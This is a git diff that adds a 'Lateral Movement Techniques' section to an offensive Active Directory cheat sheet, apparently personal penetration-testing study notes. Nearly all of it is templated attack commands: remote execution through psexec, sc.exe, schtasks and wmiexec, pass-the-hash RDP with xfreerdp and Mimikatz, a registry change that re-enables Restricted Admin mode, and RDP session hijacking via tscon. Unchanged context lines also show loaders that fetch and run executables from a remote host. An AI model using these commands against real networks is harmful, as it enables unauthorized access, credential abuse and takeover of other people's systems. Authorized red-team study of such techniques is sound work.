@@ -11,6 +11,7 @@
   * [Overpass The Hash](#Overpass-The-Hash)
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 * [Offensive .NET](#Offensive-.NET)
+* [Lateral Movement Techniques](#Lateral-Movement-Techniques)
 
 ## General
 #### Add domain user to localadmin
@@ -344,3 +345,67 @@ C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
 ```
 C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
 ```
+
+## Lateral Movement Techniques
+### PSexec
+```
+psexec.exe -u <DOMAIN>\<USER> -p <PASSWORD> \\<TARGET> cmd.exe
+python psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
+```
+
+### SC.exe
+- Smbexec.py can be used to automate the process
+```
+sc.exe \\<TARGET> create SERVICE_NAME displayname=NAME binpath="COMMAND" start=demand
+sc.exe \\<TARGET> start SERVICE_NAME
+sc.exe \\<TARGET> delete SERVICE_NAME
+```
+
+### Schtasks.exe
+```
+schtasks /create /F /tn <TASKNAME> /tr COMMAND /sc once /st 23:00 /s <TARGET> /U <USER> /P <PASSWORD>
+schtasks /run /F /tn <TASKNAME> /s <TARGET> /U <USER> /P <PASSWORD>
+schtasks /delete /F /tn <TASKNAME> /s <TARGET>
+```
+
+### AT
+```
+reg.py
+atexec.py
+```
+
+### WMI
+```
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
+``` 
+
+### PoisonHandler
+- https://github.com/Mr-Un1k0d3r/PoisonHandler
+
+### Rdp
+#### Pass the hash rdp xfreerdp
+```
+xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM HASH> /v:<TARGET>
+```
+
+#### Pass the hash RDP
+```
+Invoke-Mimikatz -Command "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm<NTLM HASH> /run:'mstsc.exe /restrictedadmin'"
+```
+
+- If the admin mode is disabled
+```
+Enter-PSSession -Computername <TARGET>
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+```
+
+#### Hijack RDP session
+```
+query user
+sc.exe create rdphijack binpath="cmd.exe /c tscon <ID> /dest:<SESSION NAME>"
+net start rdphijack
+sc.exe delete rdphijack
+```
+
+#### Accessing RDP credentials
+- Complicated have to access ECPPTX again and try it out
